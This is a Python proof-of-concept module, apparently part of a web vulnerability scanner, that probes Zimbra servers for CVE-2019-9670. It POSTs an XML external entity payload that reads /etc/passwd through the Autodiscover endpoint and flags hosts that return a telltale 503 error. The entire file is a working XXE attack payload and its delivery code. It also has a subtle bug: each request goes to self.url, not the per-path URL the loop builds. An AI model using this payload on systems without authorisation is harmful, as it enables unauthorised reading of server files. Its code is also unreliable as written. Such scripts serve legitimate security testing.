#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2019-9670'
        self.keyword = ['zimbra']
        self.info = 'Zimbra xxe.(CVE-2019-9670)'
        self.type = 'xxe'
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url != None:
            _data = """<!DOCTYPE xxe [
                    <!ELEMENT name ANY >
                    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                     <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                        <Request>
                          <EMailAddress>aaaaa</EMailAddress>
                          <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
                        </Request>
                      </Autodiscover>"""
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    url = path + "/Autodiscover/Autodiscover.xml"
                    async with session.post(url=self.url, data=_data) as res:
                        if res!=None:
                            text = await res.text()
                            if 'Error 503 Requested response schema not available'in text:
                                self.flag = 1
                                self.res.append({"info": url, "key":"zimbra xxe"})
                                break